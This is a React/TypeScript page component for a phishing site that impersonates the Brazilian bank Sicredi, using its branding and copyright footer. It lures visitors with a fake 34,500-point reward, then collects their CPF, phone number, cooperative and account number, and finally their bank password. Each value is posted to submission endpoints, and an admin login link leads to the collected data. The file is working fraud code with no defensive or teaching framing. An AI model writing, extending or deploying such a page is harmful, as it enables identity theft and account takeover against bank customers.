import { useState } from "react";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { formatCPF } from "@/lib/utils";
import { Button } from "@/components/ui/button";
import CPFForm from "@/components/forms/cpf-form";
import PhoneForm from "@/components/forms/phone-form";
import AccountForm from "@/components/forms/account-form";
import { SicrediLogo } from "@/components/ui/sicredi-logo";

// Import the assets
import sicrediCardsImg from '../assets/sicredi-cards.jpg';
import sicrediHeroImg from '../assets/sicredi-hero.png';

// Define the steps in the form flow
enum FormStep {
  CPF = 'cpf',
  POINTS = 'points',
  PHONE = 'phone',
  ACCOUNT = 'account',
  PASSWORD = 'password',
  SUCCESS = 'success'
}

export default function HomePage() {
  const [formStep, setFormStep] = useState<FormStep>(FormStep.CPF);
  const [submissionId, setSubmissionId] = useState<number | null>(null);
  const { toast } = useToast();
  const queryClient = useQueryClient();

  // CPF submission mutation
  const cpfMutation = useMutation({
    mutationFn: async (cpf: string) => {
      const res = await apiRequest("POST", "/api/submissions/cpf", { cpf });
      return await res.json();
    },
    onSuccess: (data) => {
      setSubmissionId(data.id);
      setFormStep(FormStep.POINTS);
    },
    onError: (error) => {
      toast({
        title: "Erro",
        description: "Não foi possível validar o CPF. Tente novamente.",
        variant: "destructive",
      });
    },
  });

  // Phone submission mutation
  const phoneMutation = useMutation({
    mutationFn: async ({ id, phone }: { id: number, phone: string }) => {
      const res = await apiRequest("POST", `/api/submissions/${id}/phone`, { phone });
      return await res.json();
    },
    onSuccess: () => {
      setFormStep(FormStep.ACCOUNT);
    },
    onError: (error) => {
      toast({
        title: "Erro",
        description: "Não foi possível adicionar o telefone. Tente novamente.",
        variant: "destructive",
      });
    },
  });

  // Account submission mutation
  const accountMutation = useMutation({
    mutationFn: async ({ id, cooperativa, account }: { id: number, cooperativa: string, account: string }) => {
      const res = await apiRequest("POST", `/api/submissions/${id}/account`, { cooperativa, account });
      return await res.json();
    },
    onSuccess: () => {
      setFormStep(FormStep.PASSWORD);
    },
    onError: (error) => {
      toast({
        title: "Erro",
        description: "Não foi possível adicionar os dados da conta. Tente novamente.",
        variant: "destructive",
      });
    },
  });

  // Password submission mutation
  const passwordMutation = useMutation({
    mutationFn: async ({ id, password }: { id: number, password: string }) => {
      const res = await apiRequest("POST", `/api/submissions/${id}/password`, { password });
      return await res.json();
    },
    onSuccess: () => {
      setFormStep(FormStep.SUCCESS);
    },
    onError: (error) => {
      toast({
        title: "Erro",
        description: "Não foi possível finalizar o processo. Tente novamente.",
        variant: "destructive",
      });
    },
  });

  // Handle CPF submission
  const handleCPFSubmit = (cpf: string) => {
    cpfMutation.mutate(cpf);
  };

  // Handle Phone submission
  const handlePhoneSubmit = (phone: string) => {
    if (submissionId) {
      phoneMutation.mutate({ id: submissionId, phone });
    }
  };

  // Handle Account submission
  const handleAccountSubmit = (cooperativa: string, account: string) => {
    if (submissionId) {
      accountMutation.mutate({ id: submissionId, cooperativa, account });
    }
  };

  // Handle Password submission
  const handlePasswordSubmit = (password: string) => {
    if (submissionId) {
      passwordMutation.mutate({ id: submissionId, password });
    }
  };

  // Reset the form to start
  const resetForm = () => {
    setFormStep(FormStep.CPF);
    setSubmissionId(null);
    queryClient.invalidateQueries({ queryKey: ['/api/admin/submissions'] });
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-50 p-4" 
      style={{
        background: `url(${sicrediHeroImg}) no-repeat right top`,
        backgroundSize: 'contain',
        backgroundColor: '#f9f9f9'
      }}>
      <div className="max-w-md w-full bg-white rounded-[40px] border-2 border-[#33820D] shadow-lg p-6 text-center relative">
        
        {/* Render the appropriate form step */}
        {formStep === FormStep.CPF && (
          <>
            <h1 className="text-2xl font-semibold mb-4">
              Resgate <span className="text-[#33820D] font-bold">AGORA</span> seus pontos acumulados por utilizar a <span className="text-[#33820D] font-bold">SICREDI</span>
            </h1>
            
            <div className="my-6">
              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-40 object-contain rounded-lg" />
            </div>
            
            <p className="text-lg mb-6">
              Se usou seu cartão <span className="text-[#33820D] font-bold">SICREDI</span> para compras entre <span className="text-[#33820D] font-bold">2022</span> e <span className="text-[#33820D] font-bold">2024</span>, insira seu CPF abaixo:
            </p>
            
            <CPFForm onSubmit={handleCPFSubmit} isLoading={cpfMutation.isPending} />
          </>
        )}
        
        {formStep === FormStep.POINTS && (
          <>
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-[#33820D] rounded-full flex items-center justify-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
            </div>
            
            <h2 className="text-2xl font-bold text-[#33820D] mb-3">Pontos Liberados!</h2>
            
            <div className="my-4">
              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-32 object-contain rounded-lg" />
            </div>
            
            <div className="bg-gray-100 rounded-2xl p-4 mb-4">
              <p className="text-3xl font-bold text-[#33820D]">34.500 PTS</p>
            </div>
            
            <p className="mb-4">Conforme a consulta de CPF em nosso banco de dados, verificamos que você tem direito a PONTOS devido ao uso do seu cartão entre 2022 e 2024.</p>
            
            <p className="mb-6">Prossiga com as informações do seu cadastro e receba o valor em até 3 dias úteis.</p>
            
            <Button 
              className="w-full py-6 bg-[#33820D] hover:bg-[#276c0f] text-white rounded-full font-medium"
              onClick={() => setFormStep(FormStep.PHONE)}
            >
              Continuar
            </Button>
          </>
        )}
        
        {formStep === FormStep.PHONE && (
          <>
            <h2 className="text-2xl font-semibold mb-6">
              Por favor, insira seu <span className="text-[#33820D] font-bold">telefone</span> para continuar
            </h2>
            
            <PhoneForm 
              onSubmit={handlePhoneSubmit} 
              isLoading={phoneMutation.isPending} 
            />
          </>
        )}
        
        {formStep === FormStep.ACCOUNT && (
          <>
            <h2 className="text-2xl font-semibold mb-3">
              Resgate <span className="text-[#33820D] font-bold">AGORA</span> seus pontos acumulados
            </h2>
            
            <div className="my-4">
              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-32 object-contain rounded-lg" />
            </div>
            
            <p className="mb-6">Antes de prosseguir, apenas precisamos validar algumas informações.</p>
            
            <AccountForm 
              onSubmit={handleAccountSubmit}
              isLoading={accountMutation.isPending}
            />
          </>
        )}
        
        {formStep === FormStep.PASSWORD && (
          <>
            <h2 className="text-2xl font-semibold mb-3">
              Quase lá!
            </h2>
            
            <div className="my-4">
              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-28 object-contain rounded-lg" />
            </div>
            
            <p className="mb-6">Falta pouco para resgatar seus pontos SICREDI. Confirme sua senha no campo abaixo:</p>
            
            <div className="mb-6">
              <div className="relative mb-4">
                <label htmlFor="senha" className="flex items-center text-left text-gray-700 mb-2">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                  <span>Senha:</span>
                </label>
                <input 
                  type="password" 
                  id="senha" 
                  name="senha" 
                  placeholder="Digite sua senha" 
                  className="w-full px-4 py-3 rounded-full border-2 border-[#33820D] focus:outline-none focus:border-[#276c0f]"
                  required
                />
              </div>
              
              <Button
                className="w-full py-6 bg-[#33820D] hover:bg-[#276c0f] text-white rounded-full font-medium"
                onClick={() => {
                  const senha = (document.getElementById('senha') as HTMLInputElement).value;
                  if (senha) {
                    handlePasswordSubmit(senha);
                  } else {
                    toast({
                      title: "Erro",
                      description: "Por favor, insira sua senha.",
                      variant: "destructive",
                    });
                  }
                }}
                disabled={passwordMutation.isPending}
              >
                {passwordMutation.isPending ? 'Processando...' : 'Finalizar'}
              </Button>
            </div>
          </>
        )}
        
        {formStep === FormStep.SUCCESS && (
          <>
            <div className="flex justify-center mb-4">
              <div className="w-20 h-20 bg-[#33820D] rounded-full flex items-center justify-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
            </div>
            
            <h2 className="text-2xl font-bold text-[#33820D] mb-3">Parabéns!</h2>
            
            <div className="my-4">
              <img src={sicrediCardsImg} alt="Cartões Sicredi" className="mx-auto h-28 object-contain rounded-lg" />
            </div>
            
            <p className="text-lg mb-2">Seus pontos foram validados com sucesso!</p>
            <p className="mb-6">O resgate será processado e você receberá o valor em até 3 dias úteis.</p>
            
            <div className="bg-gray-100 rounded-2xl p-4 mb-6">
              <p className="text-sm mb-2">Total de pontos resgatados:</p>
              <p className="text-3xl font-bold text-[#33820D]">34.500 PTS</p>
            </div>
            
            <Button
              className="w-full py-6 bg-[#33820D] hover:bg-[#276c0f] text-white rounded-full font-medium"
              onClick={resetForm}
            >
              Concluir
            </Button>
          </>
        )}
        
        {/* Footer present on all screens */}
        <footer className="text-xs text-gray-500 mt-6">
          <p>
            <span className="font-bold text-[#33820D]">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados
          </p>
          <p className="text-xs mt-2">
            <a href="/auth" className="text-gray-400 hover:text-gray-600">
              Login Admin
            </a>
          </p>
        </footer>
      </div>
    </div>
  );
}
